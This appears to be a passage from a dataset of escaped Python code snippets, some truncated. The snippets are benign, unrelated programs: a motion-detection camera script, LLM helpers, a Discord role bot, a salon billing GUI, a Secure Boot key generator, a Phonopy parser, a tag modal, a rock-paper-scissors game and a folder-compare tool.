v4l-utils.\\033[0m\")\n        exit()\n\n# Funzione per ottenere le informazioni sulla telecamera\ndef get_camera_info():\n    try:\n        output = subprocess.check_output(['v4l2-ctl', '--list-devices']).decode('utf-8')\n        first_line = output.split('\\n')[0] \n        return first_line\n    except subprocess.CalledProcessError as e:\n        logging.error(\"Errore durante l'esecuzione di v4l2-ctl per ottenere le informazioni sulla telecamera.\")\n        return \"Informazioni sulla telecamera non disponibili\"\n\n# Funzione per aggiornare i contatori nella GUI\ndef update_counters():\n    lbl_images_count.config(text=f\"Foto acquisite: {image_count}\")\n    lbl_videos_count.config(text=f\"Video registrati: {video_count}\")\n    root.after(100, update_counters)  # Chiamata ricorsiva per aggiornare i contatori ogni 100 millisecondi\n\n# Funzione per acquisire immagini e rilevare il movimento\ndef capture_images_and_detect_motion(cap, fgbg, time_recording, output_folder, MIN_CONTOUR_AREA,\n                                     bot, first_send_successful, exit_event, image_thumbnails_queue):\n    global image_count, video_count\n    image_count = 0  \n    video_count = 0  \n\n    def cleanup_folder():\n        folder_size = sum(os.path.getsize(os.path.join(output_folder, f)) for f in os.listdir(output_folder) if os.path.isfile(os.path.join(output_folder, f)))\n        folder_size_gb = folder_size / (1024 ** 3)  # Converti in gigabyte\n        max_storage_gb = float(config.get('General', 'max_storage'))\n\n        if folder_size_gb > max_storage_gb:\n            files = sorted(os.listdir(output_folder), key=lambda x: os.path.getmtime(os.path.join(output_folder, x)))\n            files_to_keep = files[-10:]  # Mantieni solo gli ultimi 10 file\n            for file in files:\n                if file not in files_to_keep:\n                    os.remove(os.path.join(output_folder, file))\n            logging.info(\"Effettuata Pulizia Cartella Dati\")\n\n    try:\n        while not exit_event.is_set():\n            cleanup_folder()  # Controlla e pulisce la cartella prima di acquisire nuovi file\n            ret, frame = cap.read()\n            if not ret:\n                break\n            fgmask = fgbg.apply(frame)\n            blur = cv2.GaussianBlur(fgmask, (5, 5), 0)\n            ret, thresh = cv2.threshold(blur, 20, 255, cv2.THRESH_BINARY)\n            contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\n            motion_detected = False\n            for contour in contours:\n                if cv2.contourArea(contour) > MIN_CONTOUR_AREA:\n                    motion_detected = True\n                    x, y, w, h = cv2.boundingRect(contour)\n                    cv2.rectangle(frame, (x, y), (x + w, y + h), (0, 0, 255), 2)\n                    break\n            if motion_detected:\n                logging.info(\"Rilevato Movimento - %s\", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))\n                now = datetime.now()\n                video_filename = f\"{output_folder}/motion_{now.strftime('%Y%m%d%H%M%S')}.avi\"\n                out = cv2.VideoWriter(video_filename, cv2.VideoWriter_fourcc(*'XVID'), 20.0,\n                                      (int(cap.get(3)), int(cap.get(4))))\n                start_time = time.time()\n                last_image_filenames = []\n                while time.t",
    "from langchain.chat_models import ChatOpenAI\nfrom langchain import OpenAI\nfrom langchain.embeddings.sentence_transformer import SentenceTransformerEmbeddings\nfrom sentence_transformers import SentenceTransformer\nfrom langchain.vectorstores import Chroma\nimport chromadb\nfrom torch import cuda, bfloat16\nimport transformers\nfrom transformers import AutoTokenizer, AutoConfig, AutoModelForCausalLM\nfrom langchain.llms import HuggingFacePipeline\nimport os\nimport openai\n\n\n\n\nclass AnyOpenAILLM:\n    def __init__(self, *args, **kwargs):\n        # Determine model type from the kwargs\n        model_name = kwargs.get('model_name', 'gpt-3.5-turbo')\n        if model_name.split('-')[0] == 'text':\n            self.model = OpenAI(*args, **kwargs)\n            self.model_type = 'completion'\n        # else:\n        #     self.model = ChatOpenAI(*args, **kwargs)\n        #     self.model_type = 'chat'\n\n    def __call__(self, prompt: str):\n        prompt = str(prompt)\n        prompt = prompt.replace('\"', '^')\n        while True:\n            if '\\n' in prompt:\n                prompt = prompt.strip().replace('\\n', ' ')\n            else:\n                break\n        args = [{\"role\": \"user\", \"content\": prompt}]\n\n        response = openai.ChatCompletion.create(\n            model=\"gpt-4\",\n            messages=args,\n            max_tokens=100\n        )\n\n        return response.choices[0].message.content\n\n\ndef get_model(df_new_token, model):\n    bnb_config = transformers.BitsAndBytesConfig(\n        load_in_4bit=True,\n        bnb_4bit_quant_type='nf4',\n        bnb_4bit_use_double_quant=True,\n        bnb_4bit_compute_dtype=bfloat16\n    )\n\n    model_config = AutoConfig.from_pretrained(model)\n    tokenizer = AutoTokenizer.from_pretrained(model)\n    model = AutoModelForCausalLM.from_pretrained(\n        model,\n        trust_remote_code=True,\n        config=model_config,\n        # load_in_8bit=True\n        quantization_config=bnb_config,\n    )  # .half().to(device)\n    query_pipeline = transformers.pipeline(\n        \"text-generation\",\n        model=model,\n        tokenizer=tokenizer,\n        repetition_penalty=1.1,\n        max_new_tokens=df_new_token,\n        # torch_dtype=torch.float16,\n        device_map=\"auto\")\n    llm = HuggingFacePipeline(pipeline=query_pipeline)\n    return llm\n\n\ndef get_similarity_encoder(\n        encode_model=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'bert-base-nli-mean-tokens')):\n    encoder = SentenceTransformer(encode_model)\n    return encoder\n\n\ndef get_vectordb(re_no=2, df_collection_name=\"wiki_mquake_2104\",\n                 df_path=os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'database',\n                                      'chroma_mVC'),\n                 df_model_name=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'all-MiniLM-L6-v2')):\n    embeddings = SentenceTransformerEmbeddings(model_name=df_model_name)\n    chroma = chromadb.PersistentClient(path=df_path)\n    collection = chroma.get_collection(df_collection_name)\n    vectordb = Chroma(\n        client=chroma,\n        collection_name=df_collection_name,\n        embedding_function=embeddings,\n    )\n    retriever = vectordb.as_retriever(search_kwargs={\"k\": 3, \"filter\": {\n        'source': {'$nin': ['shortmem']}}})  # search_type=\"similarity_score_threshold\", \"score_threshold\": 1.3,\n    return retriever, collection, vectordb\n",
    "import os\nfrom collections import defaultdict\nfrom datetime import datetime, timedelta\n\nimport discord\nfrom discord.ext import commands\n\nintents = discord.Intents.default()\nintents.messages = True\nintents.guilds = True\nintents.reactions = True\nintents.members = True\nintents.message_content = True\n\nbot = commands.Bot(command_prefix=\"!\", intents=intents)\n\nguild_id = 1062107664932417586\nrole_id = 1224746856077332692\napo_emoji_id = 1070609258233741373\nno_apo_emoji_id = 1211374073209163876\nrules_message_id = 1062298391658377247\nrules_channel_id = 1062297825054044250\nmod_channel_id = 1224815581316780183\n\n\nasync def grant_role_to_active_users(guild_id, role_id):\n    \"\"\"\n    automatically adds APO role to people who have posted in past week\n    \"\"\"\n    try:\n        # Find the guild by ID\n        guild = bot.get_guild(guild_id)\n        if guild is None:\n            print(\"Guild not found.\")\n            return\n\n        # Find the role in the guild by ID\n        role = discord.utils.get(guild.roles, id=role_id)\n        if role is None:\n            print(\"Role not found.\")\n            return\n\n        one_week_ago = datetime.utcnow() - timedelta(weeks=1)\n        active_users = set()\n\n        # Iterate through all text channels in the guild\n        for channel in guild.text_channels:\n            try:\n                # Use history() to fetch messages from the last week\n                async for message in channel.history(limit=None, after=one_week_ago):\n                    # Add the user ID to the set of active users (if not a bot)\n                    if not message.author.bot:\n                        if message.author not in active_users:\n                            print(\"Found active author:\", message.author)\n                        active_users.add(message.author)\n            except discord.errors.Forbidden:\n                print(f\"Cannot access history for {channel.name}, skipping.\")\n                continue\n\n        # Assign the role to each active user\n        for user in active_users:\n            try:\n                if role not in user.roles:\n                    await user.add_roles(role)\n                    print(f\"Assigned {role.name} to {user.display_name}\")\n            except Exception as e2:\n                print(f\"Couldn't assign role to {user}: {e2}\")\n\n        print(\"Role assignment complete.\")\n\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n\n\nasync def purge_no_apo_users():\n    rules_channel = bot.get_channel(rules_channel_id)\n    if rules_channel is None:\n        print(\"Channel not found.\")\n        return None\n    try:\n        message = await rules_channel.fetch_message(rules_message_id)\n    except discord.NotFound:\n        print(\"Message not found.\")\n        return None\n    except discord.Forbidden:\n        print(\"Don't have permission to access message.\")\n        return None\n\n    # Find the guild by ID\n    guild = bot.get_guild(guild_id)\n    if guild is None:\n        print(\"Guild not found.\")\n        return\n\n    # Find the role in the guild by ID\n    role = discord.utils.get(guild.roles, id=role_id)\n    if role is None:\n        print(\"Role not found.\")\n        return\n\n    for reaction in message.reactions:\n        if (\n            isinstance(reaction.emoji, discord.Emoji)\n            and reaction.emoji.id == no_apo_emoji_id\n        ):\n            async for user in reaction.users():\n                try:\n                    print(\"Removing role:\", user)\n                    if role in user.roles:\n                        await user.remove_roles(role)\n                except Exception as e2:\n                    print(f\"Couldn't remove role from {user}: {e2}\")\n\n\n@bot.command(name=\"assignroles\")\nasync def assign_roles_command(ctx):\n    await grant_role_to_active_users(guild_id, role_id)\n    await ctx.send(\"Role assignment process initiated.\")\n\n\n@bot.event\nasync def on_raw_reaction_add(payload):\n    if payload.emoji.id == apo_emoji_id and payload.message_id == rules_message_id:\n        try:\n            user = await bot.fetch_user(payload.user_id)\n            guild = bot.get_guild(payload.guild_id)\n            member = guild.get_member(payload.user_id)\n            role = discord.utils.get(guild.roles, id=role_id)\n            if role:\n                print(f\"Adding {role.name} to {user.name}\")\n                # Add the role to the user\n                await member.add_roles(role)\n                print(f\"Added {role.name} to {user.name}\")\n        except Exception as e2:\n            print(f\"Couldn't assign role to {user}: {e2}\")\n\n    if payload.message_id == rules_message_id:\n        await purge_no_apo_users()\n\n\n# map from user+hash(message) to list of (timestamp, channel)\nuser_messages = defaultdict(list)\n\n\ndef clean_up_old_timestamps(now):\n    one_minute_ago = now - timedelta(minutes=1)\n\n    for key, timestamps in list(user_messages.items()):\n        # Keep only timestamps that are less than a minute old\n        new_timestamps = [\n            timestamp for timestamp in timestamps if timestamp",
    "from tkinter import *\nfrom tkinter import messagebox\nimport random,os\n\nif not os.path.exists('bills'):\n    os.mkdir('bills')\n\ndef bill_save():\n    global billnumber\n    result = messagebox.askyesno('Confirm','Do you want to save the bill?')\n    if result:\n        bill_content = textarea.get(1.0,END)\n        file = open(f'bills/ {billnumber}.txt','w')\n        file.write(bill_content)\n        file.close()\n        messagebox.showinfo('Success',f'Bill Number {billnumber} is saved successfully')\n        billnumber=random.randint(500,1000)\n\n# def search_bill():\n#     for i in os.listdir('bills/'):\n#         if i.split('.')[0]==BillEntry.get():\n#             f = open('bills/{i}','r')\n#             textarea.delete(1.0,END)\n#             for data in f:\n#                 textarea.insert(END,data)\n#             f.close()\n#             break\n#     else:\n#         messagebox.showerror('Error','Invalid bill number')\n\nbillnumber=random.randint(500,1000)\n\n#Create the functionality\ndef validate_input(new_value):\n    if new_value.isdigit() and len(new_value) <= 10:\n        return True\n    elif new_value == \"\":\n        return True\n    else:\n        return False\n    \ndef bill():    \n    if nameEntry.get() == '' or PhoneEntry.get() == '' or AddEntry.get() == '':\n        messagebox.showerror('Error','Customer Details are required')\n    else:\n        textarea.delete(1.0,END)\n        textarea.insert(END,'\\t\\t\\t\\tXYZ Saloon\\n\\t\\t\\t\\t   India\\n')\n        textarea.insert(END,f'\\nBill Number: {billnumber}\\n')\n        textarea.insert(END,f'\\nCustomer Name: {nameEntry.get()}\\n')\n        textarea.insert(END,f'\\nPhone Number: {PhoneEntry.get()}\\n')\n        textarea.insert(END,f'\\nAddress: {AddEntry.get()}')\n        textarea.insert(END,'\\n------------------------------------------------------------------------')\n        textarea.insert(END,'Service\\t\\t\\tQuantity\\t\\t\\tPrice')\n        textarea.insert(END,'\\n========================================================================')\n        if Hair_cutEntry.get()!='0':\n            textarea.insert(END,f'\\nHair Cut\\t\\t\\t{Hair_cutEntry.get()}\\t\\t\\tRs {hair_cutservice_price}')\n        if WaxingEntry.get()!='0':\n            textarea.insert(END,f'\\nWaxing\\t\\t\\t{WaxingEntry.get()}\\t\\t\\tRs {WaxingEntryservice_price}')\n        if HairwashEntry.get()!='0':\n            textarea.insert(END,f'\\nHair Wash\\t\\t\\t{HairwashEntry.get()}\\t\\t\\tRs {HairwashEntryservice_price}')\n        if FacialEntry.get()!='0':\n            textarea.insert(END,f'\\nFacial\\t\\t\\t{FacialEntry.get()}\\t\\t\\tRs {FacialEntryservice_price}')\n        if FacebleachEntry.get()!='0':\n            textarea.insert(END,f'\\nFace Bleach\\t\\t\\t{FacebleachEntry.get()}\\t\\t\\tRs {FacebleachEntryservice_price}')\n        if HairspaEntry.get()!='0':\n            textarea.insert(END,f'\\nHair Spa\\t\\t\\t{HairspaEntry.get()}\\t\\t\\tRs {HairspaEntryservice_price}')\n        if MedicureEntry.get()!='0':\n            textarea.insert(END,f'\\nMedicure\\t\\t\\t{MedicureEntry.get()}\\t\\t\\tRs {MedicureEntryservice_price}')\n        if PedicureEntry.get()!='0':\n            textarea.insert(END,f'\\nPedicure\\t\\t\\t{PedicureEntry.get()}\\t\\t\\tRs {PedicureEntryservice_price}')    \n        if MassageEntry.get()!='0':\n            textarea.insert(END,f'\\nMassage\\t\\t\\t{MassageEntry.get()}\\t\\t\\tRs {MassageEntryservice_price}')       \n        if EyebrowEntry.get()!='0':\n            textarea.insert(END,f'\\nEyebrow\\t\\t\\t{EyebrowEntry.get()}\\t\\t\\tRs {EyebrowEntryservice_price}')   \n        if HaircolourEntry.get()!='0':\n            textarea.insert(END,f'\\nHair Colour\\t\\t\\t{HaircolourEntry.get()}\\t\\t\\tRs {HaircolourEntryservice_price}')   \n        if MakeupEntry.get()!='0':\n            textarea.insert(END,f'\\nMakeup\\t\\t\\t{MakeupEntry.get()}\\t\\t\\tRs {MakeupEntryservice_price}')   \n        if  LorealEntry.get()!='0':\n            textarea.insert(END,f'\\nLoreal Shampoo\\t\\t\\t{LorealEntry.get()}\\t\\t\\tRs {LorealEntry_price}')\n        if  DoveEntry.get()!='0':\n            textarea.insert(END,f'\\nDove Shampoo\\t\\t\\t{DoveEntry.get()}\\t\\t\\tRs {DoveEntry_price}')     \n        if  PanteneEntry.get()!='0':\n            textarea.insert(END,f'\\nPantene Shampoo\\t\\t\\t{PanteneEntry.get()}\\t\\t\\tRs {PanteneEntry_price}')         \n        if  VLCCEntry.get()!='0':\n            textarea.insert(END,f'\\nVLCC Shampoo\\t\\t\\t{VLCCEntry.get()}\\t\\t\\tRs {VLCCEntry_price}') \n        if  SunsilkEntry.get()!='0':\n            textarea.insert(END,f'\\nSunsilk Shampoo\\t\\t\\t{SunsilkEntry.get()}\\t\\t\\tRs {SunsilkEntry_price}')     \n        if  ClinicplusEntry.get()!='0':\n            textarea.insert(END,f'\\nClinic Plus Shampoo\\t\\t\\t{ClinicplusEntry.get()}\\t\\t\\tRs {ClinicplusEntry_price}')  \n        textarea.insert(END,f'\\nOther Service\\t\\t\\t\\t\\t\\tRs {OtherServicePriceEntry.get()}') \n        textarea.insert(END,'\\n------------------------------------------------------------------------')\n        textarea.insert(END,f'\\nGST\\t\\t\\t\\t\\t\\t10%') \n        textarea.insert(END,f'\\nCGST\\t\\t\\t\\t\\t\\t10%') \n        textarea.insert(END,'\\n---------------------",
    "import hashlib\nfrom pathlib import Path\nimport os\nimport shutil\nimport subprocess\nimport urllib.parse\nimport urllib.request\n\ndirectories = [\"keys\"]\nfor dir in directories:\n    if os.path.exists(dir):\n        shutil.rmtree(dir)\n    os.makedirs(dir, exist_ok=True)\n\n# Color Definition\ndef print_message(message, color):\n    colors = {\n        \"red\": \"\\033[91m\",\n        \"green\": \"\\033[92m\",\n        \"blue\": \"\\033[94m\",\n        \"yellow\": \"\\033[93m\",\n        \"end\": \"\\033[0m\",\n    }\n    print(f\"{colors.get(color, colors['end'])}{message}{colors['end']}\")\n\nprint(\"----------------------------------------------------------------------------\")\nprint_message(\"Generating OpenCore Secure Boot UUID\", \"yellow\")\nprint(\"----------------------------------------------------------------------------\")\n\nkeys_dir = \"keys\"\nguid_file = Path(keys_dir, \"guid.txt\")\nsubprocess.run([\"uuidgen\", \"--random\"], stdout=open(guid_file, \"w\"), text=True)\nguid_content = guid_file.read_text().strip()\nprint(\"Generated UUID:\", guid_content)\n\nprint(\"----------------------------------------------------------------------------\")\nprint_message(\"Generating Certificates\", \"yellow\")\nprint(\"----------------------------------------------------------------------------\")\n\n\ndef generate_certificate():\n    choice = input(\"Press '1' for default certificate or '2' for custom certificate: \")\n    if choice == \"1\":\n        country = \"US\"\n        state = \"California\"\n        locality = \"Cupertino\"\n        organization = \"Archlinux\"\n        common_name = \"Linux\"\n    elif choice == \"2\":\n        country = input(\"Enter country code (i.e. US): \")\n        state = input(\"Enter state (i.e. Washington): \")\n        locality = input(\"Enter locality (i.e. Redmond): \")\n        organization = input(\"Enter organization (i.e. Microsoft Corporation): \")\n        common_name = input(\"Enter any common name: \")\n    else:\n        print(\"Invalid choice. Exiting.\")\n        return\n\n    print(\"Certificate details:\")\n    print(f\"Country: {country}\")\n    print(f\"State: {state}\")\n    print(f\"Locality: {locality}\")\n    print(f\"Organization: {organization}\")\n    print(f\"Common Name: {common_name}\")\n\n    keys_dir = \"keys\"\n\n    try:\n        print_message(\"Generating PK\", \"blue\")\n        pk_path = Path(keys_dir) / \"PK\"\n        subprocess.run(\n            [\n                \"openssl\",\n                \"req\",\n                \"-newkey\",\n                \"rsa:4096\",\n                \"-nodes\",\n                \"-keyout\",\n                f\"{pk_path}.key\",\n                \"-new\",\n                \"-x509\",\n                \"-sha256\",\n                \"-days\",\n                \"3650\",\n                \"-subj\",\n                f\"/C={country}/ST={state}/L={locality}/O={organization}/CN={common_name} Platform Key/\",\n                \"-out\",\n                f\"{pk_path}.crt\",\n            ],\n            check=True,\n            stdout=subprocess.DEVNULL,  # Suppress stdout\n            stderr=subprocess.DEVNULL,  # Suppress stderr\n        )\n        subprocess.run(\n            [\n                \"openssl\",\n                \"x509\",\n                \"-outform\",\n                \"DER\",\n                \"-in\",\n                f\"{pk_path}.crt\",\n                \"-out\",\n                f\"{pk_path}.cer\",\n            ],\n            check=True,\n            stdout=subprocess.DEVNULL,  # Suppress stdout\n            stderr=subprocess.DEVNULL,  # Suppress stderr\n        )\n        subprocess.run(\n            [\n                \"cert-to-efi-sig-list\",\n                \"-g\",\n                guid_content,\n                f\"{pk_path}.crt\",\n                f\"{pk_path}.esl\",\n            ],\n            check=True,\n            stdout=subprocess.DEVNULL,  # Suppress stdout\n            stderr=subprocess.DEVNULL,  # Suppress stderr\n        )\n        subprocess.run(\n            [\n                \"sign-efi-sig-list\",\n                \"-g\",\n                guid_content,\n                \"-k\",\n                f\"{pk_path}.key\",\n                \"-c\",\n                f\"{pk_path}.crt\",\n                \"PK\",\n                f\"{pk_path}.esl\",\n                f\"{pk_path}.auth\",\n            ],\n            check=True,\n            stdout=subprocess.DEVNULL,  # Suppress stdout\n            stderr=subprocess.DEVNULL,  # Suppress stderr\n        )\n        print_message(\"Generating PK successful.\", \"green\")\n        calculate_checksums(pk_path)\n\n        print_message(\"Generating noPK\", \"blue\")\n        no_pk_path = Path(keys_dir) / \"noPK\"\n        subprocess.run(\n            [\n                \"sign-efi-sig-list\",\n                \"-g\",\n                guid_content,\n                \"-c\",\n                f\"{pk_path}.crt\",\n                \"-k\",\n                f\"{pk_path}.key\",\n                \"PK\",\n                \"/dev/null\",\n                f\"{no_pk_path}.auth\",\n            ],\n            check=True,\n            stdout=subprocess.DEVNULL,  # Suppress stdout\n            stderr=subprocess.DEVNULL,  # Suppress stderr\n        )\n        print_message(\"Generating noPK successful.\", \"green\")\n     ",
    "from typing import Optional\nfrom pathlib import Path\nimport numpy as np\n\n\nclass SystemVibrationModesInfo:\n    \"\"\"\n    Stores and provides access to the vibrational modes information of a system.\n    This class encapsulates eigenvectors, eigenvalues, and number of atoms\n    associated with the vibrational modes of a crystalline system.\n\n    Args:\n    - eigenvectors (np.ndarray): an array of vibrational eigenvectors.\n    - eigenvalues (np.ndarray): an array of vibrational frequencies.\n    - number_atoms (int): the number of atoms in the system.\n    \"\"\"\n\n    def __init__(self, eigenvectors: np.array, eigenvalues: np.array, number_atoms: int):\n        \"\"\"\n        Initializes an instance of SystemVibrationModesInfo.\n\n        Args:\n        - eigenvectors (np.ndarray): an array of vibrational mode's eigenvectors.\n        - eigenvalues (np.ndarray): an array of vibrational mode's energies.\n            Should align with the `eigenvectors` array.\n        - number_atoms (int): the number of atoms in the system.\n\n        Raises:\n            ValueError: If the lengths of `eigenvectors` and `eigenvalues` do not match.\n        \"\"\"\n        if len(eigenvectors) != len(eigenvalues):\n            raise ValueError(\"Length of eigenvectors does not match number of eigenvalues.\")\n\n        self.eigenvectors = eigenvectors\n        self.eigenvalues = eigenvalues\n        self.number_atoms = number_atoms\n\n\nclass ParsePhonopyYamlFile:\n    \"\"\"\n    Parses Phonopy generated YAML file that conatins the vibrational modes' information of \n    only the gamma-point.\n    \n    This class extracts vibrational mode's eigenvector, eigenvalues and the number of\n    atoms. It also check YAML file structure correctness.\n    \n    Args:\n    - yamlfile (Path): path to YAML file.\n    \n    Methods:\n    - _extract_vibration_eigenvectors\n    - _extract_yaml_values_by_key\n    - _is_yaml_valid\n    - get_vibration_data\n    \"\"\"\n    \n    def __init__(self, yamlfile: Path) -> None:\n        \"\"\"\n        Initializes an instance of ParsePhonopyYamlFile.\n\n        Args:\n        - yamlfile (Path): path to YAML file.\n\n        Raises:\n            FileNotFoundError: If file not found in the given path.\n        \"\"\"\n        self.yamlfile = yamlfile\n        if not self.yamlfile.exists():\n            raise FileNotFoundError(f\"File {self.yamlfile} does not exist!\")\n        \n\n    def _extract_yaml_values_by_key(self, key: str) -> Optional[list[float]]:\n        \"\"\"\n        Extracts values related to a specified 'key' from the given YAML file.\n\n        Args:\n        - key (str): Key parameter for a dictionary.\n        \n        Returns:\n        - A list of extracted values as floats, if found; otherwise, None.\n        \"\"\"\n        list_of_values = []\n        with open(self.yamlfile, 'r') as file:\n            for line in file:\n                if key in line:\n                    list_of_values.append(float(line.split()[-1]))\n            if list_of_values:\n                return list_of_values\n        return None\n\n    def _extract_vibration_eigenvectors(self) -> Optional[list[list[float]]]:\n        \"\"\"\n        Extracts vibrational eigenvectors from the given YAML file.\n    \n        Returns:\n        - A nested list of extracted eigenvector values as floats,\n            if found; otherwise, None.\n        \"\"\"\n        eigenvectors = []\n        with open(self.yamlfile, 'r') as file:\n            for line in file:\n                if '- # atom ' in line:\n                    atom_displacement = []\n                    for _ in range(3):\n                        split_line = next(file).split()[2]\n                        atom_displacement.append(float(split_line[:-1]))\n                    eigenvectors.append(atom_displacement)\n            if eigenvectors:\n                return eigenvectors\n        return None\n\n    def _is_yaml_valid(self) -> bool:\n        \"\"\"\n        Validates the structure and essential keys of a given YAML file\n        obtained from Phonopy analysis.\n\n        Returns:\n        - bool: True if the YAML file's format and required keys are present,\n            otherwise raises ValueError.\n\n        Raises:\n            ValueError: If essential keys are missing\n            or\n            if there are multiple entries for a single key where only one is expected.\n        \"\"\"\n        required_keys = ['nqpoint:', 'natom:  ', 'frequency: ']\n        values = {key: self._extract_yaml_values_by_key(key) for key in required_keys}\n        eigenvectors = self._extract_vibration_eigenvectors()\n\n        for key, value in values.items():\n            if value is None:\n                raise ValueError(f\"Key '{key}' is missing in the YAML file.\")\n            if key in ['nqpoint:', 'natom:  '] and len(value) != 1:\n                raise ValueError(f\"Invalid YAML file! Only one '{key}' must exist.\")\n\n        if eigenvectors is None:\n            raise ValueError(\"Eigenvectors are missing in the YAML file.\")\n        return True\n\n    def get_vibration_data(self) -> SystemVibrationModesInfo:\n        \"\"\"\n       ",
    "# -*- coding: utf-8 -*-\n\"\"\"This module contains the modal classes used in the Tagsy application.\"\"\"\n# pylint: disable=arguments-differ,duplicate-code\n\nimport disnake\n\nfrom db import add_message\nfrom helper import generate_recommendations, tag_exists\nfrom views import YesNoView\n\n\nclass AddTagModal(disnake.ui.Modal):\n    \"\"\"A modal for adding a new tag.\"\"\"\n\n    def __init__(self, server_id, prefill_message=\"\"):\n        \"\"\"\n        Initialize the AddTagModal.\n\n        Args:\n            server_id (int): The ID of the server where the tag will be added.\n        \"\"\"\n        self.server_id = server_id\n        components = [\n            disnake.ui.TextInput(\n                label=\"Tag\",\n                custom_id=\"tag\",\n                style=disnake.TextInputStyle.short,\n                placeholder=\"Enter tag name\",\n                max_length=50,\n                min_length=3,\n            ),\n            disnake.ui.TextInput(\n                label=\"Message\",\n                custom_id=\"message\",\n                style=disnake.TextInputStyle.paragraph,\n                placeholder=\"Enter the message for the tag\",\n                max_length=1024,\n                value=prefill_message,\n            ),\n        ]\n        super().__init__(title=\"Create Tag\", components=components)\n\n    async def callback(self, interaction: disnake.ModalInteraction):\n        tag = interaction.text_values[\"tag\"]\n        message = interaction.text_values[\"message\"]\n        exists = await tag_exists(self.server_id, tag)\n\n        if exists:\n            recommendations = generate_recommendations(tag)\n            recommendations_str = \", \".join(recommendations)\n            await interaction.response.send_message(\n                f\"The tag `{tag}` already exists. Suggestions: {recommendations_str}.\",\n                ephemeral=True,\n            )\n        else:\n            if \"\\n\" in message:\n                view = YesNoView(\n                    tag,\n                    message,\n                    action=\"add\",\n                    user_id=str(interaction.user.id),\n                    server_id=self.server_id,\n                )\n                await interaction.response.send_message(\n                    \"Do you want to add the message as a block code?\",\n                    view=view,\n                    ephemeral=True,\n                )\n            else:\n                await add_message(\n                    self.server_id, tag, message, str(interaction.user.id)\n                )\n                await interaction.response.send_message(\n                    f\"Tag `{tag}` added with message: {message}\", ephemeral=True\n                )\n",
    "import random\n\nrock = '''\n    _______\n---'   ____)\n      (_____)\n      (_____)\n      (____)\n---.__(___)\n'''\n\npaper = '''\n    _______\n---'   ____)____\n          ______)\n          _______)\n         _______)\n---.__________)\n'''\n\nscissors = '''\n    _______\n---'   ____)____\n          ______)\n       __________)\n      (____)\n---.__(___)\n'''\n\n#Write your code below this line \ud83d\udc47\n\nfotos = [rock, paper, scissors]\nspieler_wahl  = int(input(\"Was w\u00e4hlst du?: (help, 0, 1, 2)\\n\").lower())\nprint(fotos[spieler_wahl])\n\ncomputer_wahl = random.randint(0,2)\nprint(\"Computer w\u00e4hlt: \")\nprint(fotos[computer_wahl])\n\n\n\nif spieler_wahl == \"help\":\n    print(\"0 = Rock, 1 = Paper, 2 = Scissors\")\n    exit()\nif int(spieler_wahl) >= 3 or int(spieler_wahl) < 0 :\n    print(\"Ung\u00fcltige Eingabe\")\n    exit()\n\nspieler_wahl = int(spieler_wahl)\n\nif spieler_wahl == 0 and computer_wahl == 2:\n    print(\"Du gewinnst!\")\nelif computer_wahl == 0 and spieler_wahl == 2:\n    print(\"Computer gewinnt!\")\nelif computer_wahl > spieler_wahl:\n    print(\"Computer gewinnt!\")\nelif spieler_wahl > computer_wahl:\n    print(\"Du gewinnst!\")\nelse:\n    print(\"Unentschieden!\")    \n",
    "import argparse\nimport os\nimport filecmp\n\ndef compare_folders(source, target):\n    \"\"\"\n    Compare the contents of two folders.\n\n    Args:\n        source (str): Path to the source folder.\n        target (str): Path to the target folder.\n\n    Returns:\n        Dircmp: Object containing the comparison results.\n    \"\"\"\n    diffs = filecmp.dircmp(source, target)\n    return diffs\n\ndef compare_files(source_file, target_file):\n    \"\"\"\n    Compare the content of two text files.\n\n    Args:\n        source_file (str): Path to the source file.\n        target_file (str): Path to the target file.\n\n    Returns:\n        bool: True if the content of both files is identical, False otherwise.\n    \"\"\"\n    with open(source_file, 'r', encoding='utf-8', errors='ignore') as sf, open(target_file, 'r', encoding='utf-8', errors='ignore') as tf:\n        source_content = sf.read()\n        target_content = tf.read()\n    return source_content == target_content\n\ndef generate_txt_report(diffs, report_file):\n    \"\"\"\n    Generate a TXT report based on the comparison results.\n\n    Args:\n        diffs (Dircmp): Object containing the comparison results.\n        report_file (str): Path to the output TXT report file.\n    \"\"\"\n    def format_txt(diff, path=\"\"):\n        output = \"\"\n        for name in diff.common_dirs:\n            output += format_txt(diff.subdirs[name], os.path.join(path, name))\n        for name in diff.common_files:\n            source_file = os.path.join(diff.left, name)\n            target_file = os.path.join(diff.right, name)\n            if not compare_files(source_file, target_file):\n                output += f\"Modified: {os.path.join(path, name)}\\n\"\n        for name in diff.left_only:\n            output += f\"Removed: {os.path.join(path, name)}\\n\"\n        for name in diff.right_only:\n            output += f\"Added: {os.path.join(path, name)}\\n\"\n        return output\n\n    report_content = format_txt(diffs)\n    with open(report_file, 'w') as f:\n        f.write(report_content)\n\ndef main():\n    parser = argparse.ArgumentParser(description='Simple Folder Compare Tool')\n    parser.add_argument('source', help='Path to the source folder')\n    parser.add_argument('target', help='Path to the target folder')\n    parser.add_argument('-o', '--output', default='comparison_report.txt', help='Output TXT report file')\n    args = parser.parse_args()\n\n    source = args.source\n    target = args.target\n    report_file = args.output\n\n    if not os.path.exists(source) or not os.path.exists(target):\n        print(\"Error: Source or target folder does not exist.\")\n        return\n\n    print(\"Comparing folders...\")\n    diffs = compare_folders(source, target)\n    print(\"Generating TXT report...\")\n    generate_txt_report(diffs, report_file)\n    print(f\"Comparison report generated at {report_file}\")\n\nif __name__ == \"__main__\":\n    main()\n",
